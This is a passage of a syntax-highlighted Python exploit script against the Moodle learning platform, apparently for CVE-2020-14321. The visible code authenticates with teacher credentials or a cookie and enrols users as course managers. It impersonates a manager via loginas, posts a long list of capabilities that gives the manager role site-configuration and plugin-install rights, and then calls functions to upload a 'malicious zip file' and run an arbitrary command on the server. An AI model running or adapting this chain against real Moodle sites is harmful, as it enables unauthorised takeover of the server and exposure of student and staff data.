class="string">&quot;username&quot;</span> : username,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> : password</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        r = session.post(url + <span class="string">&#x27;/login/index.php&#x27;</span>, data=data_post)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Recently accessed courses&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            p1.failure(Color.RED + <span class="string">&quot;✘&quot;</span> + Color.END)</span><br><span class="line">            <span class="built_in">print</span>(Color.RED + <span class="string">&quot;\nInvalid credentials.\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        id_user = re.findall(<span class="string">r&#x27;id=&quot;nav-notification-popover-container&quot; data-userid=&quot;(.*?)&quot;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">        sess_key = re.findall(<span class="string">r&#x27;&quot;sesskey&quot;:&quot;(.*?)&quot;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        p1.success(Color.BLUE + username + <span class="string">&quot;:&quot;</span> + password + Color.END + Color.YELLOW + <span class="string">&quot; ✓&quot;</span> + Color.END)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(Color.RED + <span class="string">&quot;\nUse valid credentials or valid cookie\n&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session, id_user, sess_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enrol2rce</span>(<span class="params">session, url, id_manager, username, course_id, teacher_cookie, command</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Assign rol manager to teacher and manager account in the course.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    p4 = log.progress(<span class="string">&quot;Updating roles to move on manager accout&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(url + <span class="string">&#x27;/user/index.php&#x27;</span>, params=&#123;<span class="string">&quot;id&quot;</span>:course_id&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        teacher_user = re.findall(<span class="string">r&#x27;class=&quot;usertext mr-1&quot;&gt;(.*?)&lt;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        p4.failure(Color.RED + <span class="string">&quot;✘&quot;</span> + Color.END)</span><br><span class="line">        <span class="built_in">print</span>(Color.RED + <span class="string">&quot;\nInvalid cookie, try again, verify cookie domain and cookie path or simply change all.\n&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p4.status(<span class="string">&quot;Teacher &quot;</span> + Color.BLUE + teacher_user + Color.END)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    id_user = re.findall(<span class="string">r&#x27;id=&quot;nav-notification-popover-container&quot; data-userid=&quot;(.*?)&quot;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">    sess_key = re.findall(<span class="string">r&#x27;&quot;sesskey&quot;:&quot;(.*?)&quot;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    session = update_rol(session, url, sess_key, course_id, id_user)</span><br><span class="line">    session = update_rol(session, url, sess_key, course_id, id_manager)</span><br><span class="line"></span><br><span class="line">    data_get = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span> : course_id,</span><br><span class="line">        <span class="string">&quot;user&quot;</span> : id_manager,</span><br><span class="line">        <span class="string">&quot;sesskey&quot;</span> : sess_key</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = session.get(url + <span class="string">&#x27;/course/loginas.php&#x27;</span>, params=data_get)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are logged in as&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        p4.failure(Color.RED + <span class="string">&quot;✘&quot;</span> + Color.END)</span><br><span class="line">        <span class="built_in">print</span>(Color.RED + <span class="string">&quot;\nError trying to move on manager account. Validate credentials (or cookie).\n&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p4.success(Color.YELLOW + <span class="string">&quot;✓&quot;</span> + Color.END)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    sess_key = re.findall(<span class="string">r&#x27;&quot;sesskey&quot;:&quot;(.*?)&quot;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Updating rol manager to enable install plugins</span></span><br><span class="line">    session, sess_key = update_rol_manager(session, url, sess_key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Upload malicious zip file</span></span><br><span class="line">    zipb64_up(session, url, sess_key, teacher_user, course_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># RCE on system</span></span><br><span class="line">    moodle_RCE(url, command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_rol</span>(<span class="params">session, url, sess_key, course_id, id_user</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Updating teacher rol to enable he update other users</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    data_get = &#123;</span><br><span class="line">        <span class="string">&quot;mform_showmore_main&quot;</span> : <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;id&quot;</span> : course_id,</span><br><span class="line">        <span class="string">&quot;action&quot;</span> : <span class="string">&quot;enrol&quot;</span>,</span><br><span class="line">        <span class="string">&quot;enrolid&quot;</span> : <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sesskey&quot;</span> : sess_key,</span><br><span class="line">        <span class="string">&quot;_qf__enrol_manual_enrol_users_form&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;mform_showmore_id_main&quot;</span> : <span class="string">&quot;0&quot;</span>, </span><br><span class="line">        <span class="string">&quot;userlist[]&quot;</span> : id_user, </span><br><span class="line">        <span class="string">&quot;roletoassign&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;startdate&quot;</span> : <span class="string">&quot;4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;duration&quot;</span> : <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = session.get(url + <span class="string">&#x27;/enrol/manual/ajax.php&#x27;</span>, params=data_get)</span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_rol_manager</span>(<span class="params">session, url, sess_key</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Updating rol manager to enable install plugins</span></span><br><span class="line"><span class="string">        * Extracted from: https://github.com/HoangKien1020/CVE-2020-14321</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    p6 = log.progress(<span class="string">&quot;Updating rol manager to enable install plugins&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    data_get = &#123;</span><br><span class="line">        <span class="string">&quot;action&quot;</span>:<span class="string">&quot;edit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;roleid&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    random_desc = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_lowercase) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Headache part :P</span></span><br><span class="line">    data_post = [(<span class="string">&#x27;sesskey&#x27;</span>,sess_key),(<span class="string">&#x27;return&#x27;</span>,<span class="string">&#x27;manage&#x27;</span>),(<span class="string">&#x27;resettype&#x27;</span>,<span class="string">&#x27;none&#x27;</span>),(<span class="string">&#x27;shortname&#x27;</span>,<span class="string">&#x27;manager&#x27;</span>),(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;&#x27;</span>),(<span class="string">&#x27;description&#x27;</span>,random_desc),(<span class="string">&#x27;archetype&#x27;</span>,<span class="string">&#x27;manager&#x27;</span>),(<span class="string">&#x27;contextlevel10&#x27;</span>,<span class="string">&#x27;0&#x27;</span>),(<span class="string">&#x27;contextlevel10&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;contextlevel30&#x27;</span>,<span class="string">&#x27;0&#x27;</span>),(<span class="string">&#x27;contextlevel30&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;contextlevel40&#x27;</span>,<span class="string">&#x27;0&#x27;</span>),(<span class="string">&#x27;contextlevel40&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;contextlevel50&#x27;</span>,<span class="string">&#x27;0&#x27;</span>),(<span class="string">&#x27;contextlevel50&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;contextlevel70&#x27;</span>,<span class="string">&#x27;0&#x27;</span>),(<span class="string">&#x27;contextlevel70&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;contextlevel80&#x27;</span>,<span class="string">&#x27;0&#x27;</span>),(<span class="string">&#x27;contextlevel80&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;allowassign[]&#x27;</span>,<span class="string">&#x27;&#x27;</span>),(<span class="string">&#x27;allowassign[]&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;allowassign[]&#x27;</span>,<span class="string">&#x27;2&#x27;</span>),(<span class="string">&#x27;allowassign[]&#x27;</span>,<span class="string">&#x27;3&#x27;</span>),(<span class="string">&#x27;allowassign[]&#x27;</span>,<span class="string">&#x27;4&#x27;</span>),(<span class="string">&#x27;allowassign[]&#x27;</span>,<span class="string">&#x27;5&#x27;</span>),(<span class="string">&#x27;allowassign[]&#x27;</span>,<span class="string">&#x27;6&#x27;</span>),(<span class="string">&#x27;allowassign[]&#x27;</span>,<span class="string">&#x27;7&#x27;</span>),(<span class="string">&#x27;allowassign[]&#x27;</span>,<span class="string">&#x27;8&#x27;</span>),(<span class="string">&#x27;allowoverride[]&#x27;</span>,<span class="string">&#x27;&#x27;</span>),(<span class="string">&#x27;allowoverride[]&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;allowoverride[]&#x27;</span>,<span class="string">&#x27;2&#x27;</span>),(<span class="string">&#x27;allowoverride[]&#x27;</span>,<span class="string">&#x27;3&#x27;</span>),(<span class="string">&#x27;allowoverride[]&#x27;</span>,<span class="string">&#x27;4&#x27;</span>),(<span class="string">&#x27;allowoverride[]&#x27;</span>,<span class="string">&#x27;5&#x27;</span>),(<span class="string">&#x27;allowoverride[]&#x27;</span>,<span class="string">&#x27;6&#x27;</span>),(<span class="string">&#x27;allowoverride[]&#x27;</span>,<span class="string">&#x27;7&#x27;</span>),(<span class="string">&#x27;allowoverride[]&#x27;</span>,<span class="string">&#x27;8&#x27;</span>),(<span class="string">&#x27;allowswitch[]&#x27;</span>,<span class="string">&#x27;&#x27;</span>),(<span class="string">&#x27;allowswitch[]&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;allowswitch[]&#x27;</span>,<span class="string">&#x27;2&#x27;</span>),(<span class="string">&#x27;allowswitch[]&#x27;</span>,<span class="string">&#x27;3&#x27;</span>),(<span class="string">&#x27;allowswitch[]&#x27;</span>,<span class="string">&#x27;4&#x27;</span>),(<span class="string">&#x27;allowswitch[]&#x27;</span>,<span class="string">&#x27;5&#x27;</span>),(<span class="string">&#x27;allowswitch[]&#x27;</span>,<span class="string">&#x27;6&#x27;</span>),(<span class="string">&#x27;allowswitch[]&#x27;</span>,<span class="string">&#x27;7&#x27;</span>),(<span class="string">&#x27;allowswitch[]&#x27;</span>,<span class="string">&#x27;8&#x27;</span>),(<span class="string">&#x27;allowview[]&#x27;</span>,<span class="string">&#x27;&#x27;</span>),(<span class="string">&#x27;allowview[]&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;allowview[]&#x27;</span>,<span class="string">&#x27;2&#x27;</span>),(<span class="string">&#x27;allowview[]&#x27;</span>,<span class="string">&#x27;3&#x27;</span>),(<span class="string">&#x27;allowview[]&#x27;</span>,<span class="string">&#x27;4&#x27;</span>),(<span class="string">&#x27;allowview[]&#x27;</span>,<span class="string">&#x27;5&#x27;</span>),(<span class="string">&#x27;allowview[]&#x27;</span>,<span class="string">&#x27;6&#x27;</span>),(<span class="string">&#x27;allowview[]&#x27;</span>,<span class="string">&#x27;7&#x27;</span>),(<span class="string">&#x27;allowview[]&#x27;</span>,<span class="string">&#x27;8&#x27;</span>),(<span class="string">&#x27;block/admin_bookmarks:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/badges:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/calendar_month:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/calendar_upcoming:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/comments:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/course_list:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/globalsearch:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/glossary_random:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/html:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/lp:addinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/lp:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/mentees:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/mnet_hosts:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/myoverview:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/myprofile:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/navigation:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/news_items:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/online_users:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/private_files:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/recentlyaccessedcourses:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/recentlyaccesseditems:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/rss_client:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/settings:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/starredcourses:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/tags:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;block/timeline:myaddinstance&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;enrol/category:synchronised&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;message/airnotifier:managedevice&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/analytics:listowninsights&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/analytics:managemodels&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/badges:manageglobalsettings&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/blog:create&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/blog:manageentries&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/blog:manageexternal&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/blog:search&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/blog:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/blog:viewdrafts&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:configurecustomfields&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:recommendactivity&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/grade:managesharedforms&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/grade:sharegradingforms&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/my:configsyspages&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/my:manageblocks&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/portfolio:export&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/question:config&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/restore:createuser&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/role:manage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/search:query&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:config&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:configview&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:deleteanymessage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:deleteownmessage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:doclinks&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:forcelanguage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:maintenanceaccess&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:manageallmessaging&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:messageanyuser&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:mnetlogintoremote&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:readallmessages&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:sendmessage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:uploadusers&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:viewparticipants&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/tag:edit&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/tag:editblocks&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/tag:flag&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/tag:manage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:changeownpassword&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:create&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:delete&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:editownmessageprofile&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:editownprofile&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:ignoreuserquota&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:manageownblocks&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:manageownfiles&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:managesyspages&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:update&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/webservice:createmobiletoken&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/webservice:createtoken&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/webservice:managealltokens&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;quizaccess/seb:managetemplates&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;report/courseoverview:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;report/performance:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;report/questioninstances:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;report/security:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;report/status:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/customlang:edit&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/customlang:view&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/dataprivacy:managedataregistry&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/dataprivacy:managedatarequests&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/dataprivacy:requestdeleteforotheruser&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/lpmigrate:frameworksmigrate&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/monitor:managetool&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/policy:accept&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/policy:managedocs&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/policy:viewacceptances&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/uploaduser:uploaduserpictures&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/usertours:managetours&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;auth/oauth2:managelinkedlogins&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/badges:manageownbadges&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/badges:viewotherbadges&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:evidencedelete&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:plancomment&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:plancommentown&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:planmanage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:planmanagedraft&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:planmanageown&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:planmanageowndraft&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:planrequestreview&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:planrequestreviewown&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:planreview&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:planview&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:planviewdraft&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:planviewown&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:planviewowndraft&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:usercompetencycomment&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:usercompetencycommentown&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:usercompetencyrequestreview&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:usercompetencyrequestreviewown&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:usercompetencyreview&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:usercompetencyview&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:userevidencemanage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:userevidencemanageown&#x27;</span>,<span class="string">&#x27;0&#x27;</span>),(<span class="string">&#x27;moodle/competency:userevidenceview&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:editmessageprofile&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:editprofile&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:manageblocks&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:readuserblogs&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:readuserposts&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:viewalldetails&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:viewlastip&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/user:viewuseractivitiesreport&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;report/usersessions:manageownsessions&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/dataprivacy:downloadallrequests&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/dataprivacy:downloadownrequest&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/dataprivacy:makedatadeletionrequestsforchildren&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/dataprivacy:makedatarequestsforchildren&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/dataprivacy:requestdelete&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;tool/policy:acceptbehalf&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/category:manage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/category:viewcourselist&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/category:viewhiddencategories&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/cohort:assign&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/cohort:manage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:competencymanage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:competencyview&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:templatemanage&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/competency:templateview&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:create&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/course:request&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;moodle/site:approvecourse&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/contentbank:accesscoursecategorycontent&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;repository/contentbank:accessgeneralcontent&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span 